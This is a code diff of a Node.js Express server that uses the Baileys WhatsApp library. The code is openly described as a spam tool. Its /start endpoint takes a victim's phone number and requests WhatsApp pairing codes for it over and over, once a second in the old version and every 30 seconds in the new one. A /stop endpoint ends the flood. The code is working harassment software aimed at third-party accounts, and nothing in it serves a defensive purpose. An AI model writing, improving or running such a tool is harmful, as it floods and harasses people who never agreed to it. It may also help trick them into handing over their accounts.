@@ -1,49 +1,22 @@
-const pino = require('pino');
-const { Boom } = require('@hapi/boom');
-const fs = require('fs');
-const chalk = require('chalk');
-const FileType = require('file-type');
-const path = require('path');
-const axios = require('axios');
-const _ = require('lodash');
-const moment = require('moment-timezone');
-const PhoneNumber = require('awesome-phonenumber');
-const {
-  default: spamConnect,
-  delay,
-  PHONENUMBER_MCC,
-  makeCacheableSignalKeyStore,
-  useMultiFileAuthState,
-  DisconnectReason,
-  fetchLatestBaileysVersion,
-  generateForwardMessageContent,
-  prepareWAMessageMedia,
-  generateWAMessageFromContent,
-  generateMessageID,
-  downloadContentFromMessage,
-  makeInMemoryStore,
-  jidDecode,
-  proto,
-  Browsers
-} = require('@whiskeysockets/baileys');
-const NodeCache = require('node-cache');
-const readline = require('readline');
 const express = require('express');
+const pino = require('pino');
+const { useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, default: makeWASocket } = require('@whiskeysockets/baileys');
+const NodeCache = require('node-cache');
+const path = require('path');
+const chalk = require('chalk');
+
 const app = express();
 const port = process.env.PORT || 3000;
-
-const store = makeInMemoryStore({
-  logger: pino().child({
-    level: 'silent',
-    stream: 'store'
-  })
-});
 
 let spam;
 let interval;
 
 app.use(express.static('public'));
 app.use(express.json());
+
+app.get('/', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
 
 app.post('/start', async (req, res) => {
   const { phoneNumber } = req.body;
@@ -52,59 +25,35 @@ app.post('/start', async (req, res) => {
   }
 
   try {
-    const { version, isLatest } = await fetchLatestBaileysVersion();
-    const { state, saveCreds } = await useMultiFileAuthState('./targetsessi');
+    const { version } = await fetchLatestBaileysVersion();
+    const { state } = await useMultiFileAuthState('./targetsessi');
     const msgRetryCounterCache = new NodeCache();
 
-    spam = spamConnect({
-      logger: pino({
-        level: 'silent'
-      }),
-      printQRInTerminal: false,
+    spam = makeWASocket({
+      logger: pino({ level: 'silent' }),
+      auth: state,
       browser: Browsers.windows('Firefox'),
-      auth: {
-        creds: state.creds,
-        keys: makeCacheableSignalKeyStore(state.keys, pino({
-          level: 'fatal'
-        }).child({
-          level: 'fatal'
-        }))
-      },
-      markOnlineOnConnect: true,
-      generateHighQualityLinkPreview: true,
-      getMessage: async key => {
-        if (store) {
-          const msg = await store.loadMessage(key.remoteJid, key.id);
-          return msg.message || undefined;
-        }
-        return {
-          conversation: 'SPAM PAIRING CODE'
-        };
-      },
+      printQRInTerminal: true,
       msgRetryCounterCache: msgRetryCounterCache,
-      defaultQueryTimeoutMs: undefined
     });
-    store.bind(spam.ev);
 
     if (!spam.authState.creds.registered) {
-      while (true) {
-        let second = 100;
-        while (second > 0) {
+      console.log(chalk.bgBlack(chalk.greenBright(`Spamming pairing code for: ${phoneNumber}`)));
+      interval = setInterval(async () => {
+        try {
           let code = await spam.requestPairingCode(phoneNumber);
           code = code?.match(/.{1,4}/g)?.join('-') || code;
-          console.log(chalk.bgBlack(chalk.greenBright('Pairing Code: ' + code)));
-          console.log(chalk.bgBlack(chalk.whiteBright('Spam Berjalan Selama: ' + second + ' detik...')));
-          await new Promise(resolve => setTimeout(resolve, 1000));
-          second--;
+          console.log(chalk.bgBlack(chalk.greenBright(`Pairing Code: ${code}`)));
+        } catch (error) {
+          console.error('Error generating pairing code:', error);
         }
-        console.log(chalk.bgBlack(chalk.redBright('Mengirim Ulang Dalam 30 detik...')));
-        await new Promise(resolve => setTimeout(resolve, 30000));
-      }
+      }, 30000); // Ulang setiap 30 detik
     }
 
     res.status(200).json({ message: 'Spam started' });
   } catch (error) {
-    res.status(500).json({ error: error.message });
+    console.error('Error:', error);
+    res.status(500).json({ error: 'Failed to start spamming' });
   }
 });
 
@@ -112,6 +61,7 @@ app.post('/stop', (req, res) => {
   if (interval) {
     clearInterval(interval);
     interval = null;
+    console.log(chalk.bgBlack(chalk.redBright('Spam stopped')));
     res.status(200).json({ message: 'Spam stopped' });
   } else {
     res.status(400).json({ error: 'Spam not running' });
